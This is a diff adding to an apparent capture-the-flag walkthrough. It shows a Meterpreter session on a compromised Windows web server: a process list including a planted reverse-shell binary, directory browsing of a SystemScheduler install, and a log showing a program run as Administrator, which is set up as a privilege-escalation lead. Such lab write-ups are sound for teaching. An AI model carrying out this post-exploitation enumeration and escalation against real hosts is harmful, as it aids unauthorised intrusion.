@@ -198,4 +198,156 @@ Logged On Users : 1
 Meterpreter     : x86/windows
 meterpreter > 
 ```
+```
+meterpreter > ps
 
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User              Path
+ ---   ----  ----                  ----  -------  ----              ----
+ 0     0     [System Process]
+ 4     0     System
+ 352   680   svchost.exe
+ 372   4     smss.exe
+ 532   524   csrss.exe
+ 588   576   csrss.exe
+ 596   524   wininit.exe
+ 624   576   winlogon.exe
+ 680   596   services.exe
+ 688   596   lsass.exe
+ 748   680   svchost.exe
+ 792   680   svchost.exe
+ 876   680   svchost.exe
+ 888   624   dwm.exe
+ 912   680   svchost.exe
+ 968   680   svchost.exe
+ 1000  680   svchost.exe
+ 1152  680   spoolsv.exe
+ 1180  680   amazon-ssm-agent.exe
+ 1264  680   svchost.exe
+ 1288  680   LiteAgent.exe
+ 1428  680   svchost.exe
+ 1448  680   svchost.exe
+ 1480  680   WService.exe
+ 1600  1480  WScheduler.exe
+ 1700  680   Ec2Config.exe
+ 1800  748   WmiPrvSE.exe
+ 2132  912   taskhostex.exe
+ 2340  2360  ServerManager.exe
+ 2396  2292  explorer.exe
+ 2420  680   svchost.exe
+ 2792  1856  badr.exe
+ 2884  680   msdtc.exe
+ 3152  2480  WScheduler.exe
+ 3180  3776  reverse.exe           x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\reverse.exe
+ 3188  1448  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
+ 3492  2792  conhost.exe
+ 3752  3776  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
+ 3776  3188  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
+
+```
+
+<img width="955" height="432" alt="image" src="https://github.com/user-attachments/assets/a12f1bb5-bf32-4fc5-9a88-a875db555915" />
+
+```
+meterpreter > cd "c:/Program Files (x86)"
+```
+```
+meterpreter > dir
+Listing: c:\Program Files (x86)
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Common Files
+040777/rwxrwxrwx  4096  dir   2014-03-21 15:07:01 -0400  Internet Explorer
+040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Microsoft.NET
+040777/rwxrwxrwx  8192  dir   2019-08-04 07:37:02 -0400  SystemScheduler
+040777/rwxrwxrwx  0     dir   2019-08-06 17:12:04 -0400  Uninstall Information
+040777/rwxrwxrwx  0     dir   2013-08-22 11:39:33 -0400  Windows Mail
+040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  Windows NT
+040777/rwxrwxrwx  0     dir   2013-08-22 11:39:30 -0400  WindowsPowerShell
+100666/rw-rw-rw-  174   fil   2013-08-22 11:37:57 -0400  desktop.ini
+```
+
+```
+meterpreter > cd Systemscheduler
+```
+```
+meterpreter > dir
+Listing: c:\Program Files (x86)\Systemscheduler
+===============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+040777/rwxrwxrwx  4096     dir   2026-07-17 23:51:34 -0400  Events
+100666/rw-rw-rw-  60       fil   2019-08-04 07:36:42 -0400  Forum.url
+100666/rw-rw-rw-  9813     fil   2004-11-16 02:16:34 -0500  License.txt
+100666/rw-rw-rw-  1496     fil   2026-07-17 23:17:33 -0400  LogFile.txt
+100666/rw-rw-rw-  3760     fil   2026-07-17 23:18:39 -0400  LogfileAdvanced.txt
+100777/rwxrwxrwx  536992   fil   2018-03-25 13:58:56 -0400  Message.exe
+100777/rwxrwxrwx  445344   fil   2018-03-25 13:59:00 -0400  PlaySound.exe
+100777/rwxrwxrwx  27040    fil   2018-03-25 13:58:58 -0400  PlayWAV.exe
+100666/rw-rw-rw-  149      fil   2019-08-04 18:05:19 -0400  Preferences.ini
+100777/rwxrwxrwx  485792   fil   2018-03-25 13:58:58 -0400  Privilege.exe
+100666/rw-rw-rw-  10100    fil   2018-03-24 15:09:04 -0400  ReadMe.txt
+100777/rwxrwxrwx  112544   fil   2018-03-25 13:58:58 -0400  RunNow.exe
+100777/rwxrwxrwx  235936   fil   2018-03-25 13:58:56 -0400  SSAdmin.exe
+100777/rwxrwxrwx  731552   fil   2018-03-25 13:58:56 -0400  SSCmd.exe
+100777/rwxrwxrwx  456608   fil   2018-03-25 13:58:58 -0400  SSMail.exe
+100777/rwxrwxrwx  1633696  fil   2018-03-25 13:58:52 -0400  Scheduler.exe
+100777/rwxrwxrwx  491936   fil   2018-03-25 13:59:00 -0400  SendKeysHelper.exe
+100777/rwxrwxrwx  437664   fil   2018-03-25 13:58:56 -0400  ShowXY.exe
+100777/rwxrwxrwx  439712   fil   2018-03-25 13:58:56 -0400  ShutdownGUI.exe
+100666/rw-rw-rw-  785042   fil   2006-05-16 19:49:52 -0400  WSCHEDULER.CHM
+100666/rw-rw-rw-  703081   fil   2006-05-16 19:58:18 -0400  WSCHEDULER.HLP
+100777/rwxrwxrwx  136096   fil   2018-03-25 13:58:58 -0400  WSCtrl.exe
+100777/rwxrwxrwx  68512    fil   2018-03-25 13:58:54 -0400  WSLogon.exe
+100666/rw-rw-rw-  33184    fil   2018-03-25 13:59:00 -0400  WSProc.dll
+100666/rw-rw-rw-  2026     fil   2006-05-16 18:58:18 -0400  WScheduler.cnt
+100777/rwxrwxrwx  331168   fil   2018-03-25 13:58:52 -0400  WScheduler.exe
+100777/rwxrwxrwx  98720    fil   2018-03-25 13:58:54 -0400  WService.exe
+100666/rw-rw-rw-  54       fil   2019-08-04 07:36:42 -0400  Website.url
+100777/rwxrwxrwx  76704    fil   2018-03-25 13:58:58 -0400  WhoAmI.exe
+100666/rw-rw-rw-  1150     fil   2007-05-17 16:47:02 -0400  alarmclock.ico
+100666/rw-rw-rw-  766      fil   2003-08-31 15:06:08 -0400  clock.ico
+100666/rw-rw-rw-  80856    fil   2003-08-31 15:06:10 -0400  ding.wav
+100666/rw-rw-rw-  1637972  fil   2009-01-08 22:21:48 -0500  libeay32.dll
+100777/rwxrwxrwx  40352    fil   2018-03-25 13:59:00 -0400  sc32.exe
+100666/rw-rw-rw-  766      fil   2003-08-31 15:06:26 -0400  schedule.ico
+100666/rw-rw-rw-  355446   fil   2009-01-08 22:12:34 -0500  ssleay32.dll
+100666/rw-rw-rw-  6999     fil   2019-08-04 07:36:42 -0400  unins000.dat
+100777/rwxrwxrwx  722597   fil   2019-08-04 07:36:32 -0400  unins000.exe
+100666/rw-rw-rw-  6574     fil   2009-06-26 20:27:32 -0400  whiteclock.ico
+```
+```
+meterpreter > cd events
+```
+```
+meterpreter > dir
+Listing: c:\Program Files (x86)\Systemscheduler\events
+======================================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100666/rw-rw-rw-  1925   fil   2026-07-17 23:52:33 -0400  20198415519.INI
+100666/rw-rw-rw-  22502  fil   2026-07-17 23:52:33 -0400  20198415519.INI_LOG.txt
+100666/rw-rw-rw-  290    fil   2020-10-02 17:50:12 -0400  2020102145012.INI
+100666/rw-rw-rw-  186    fil   2026-07-17 23:48:27 -0400  Administrator.flg
+100666/rw-rw-rw-  182    fil   2026-07-17 23:48:25 -0400  SYSTEM_svc.flg
+100666/rw-rw-rw-  0      fil   2026-07-17 23:18:39 -0400  Scheduler.flg
+100666/rw-rw-rw-  449    fil   2026-07-17 23:48:27 -0400  SessionInfo.flg
+100666/rw-rw-rw-  0      fil   2026-07-17 23:50:06 -0400  service.flg
+```
+```
+meterpreter > cat 20198415519.INI_LOG.txt
+
+08/04/19 15:06:01,Event Started Ok, (Administrator)
+08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
+08/04/19 15:07:00,Event Started Ok, (Administrator)
+08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
+08/04/19 15:08:00,Event Started Ok, (Administrator)
+08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)  [...]
+```
+```
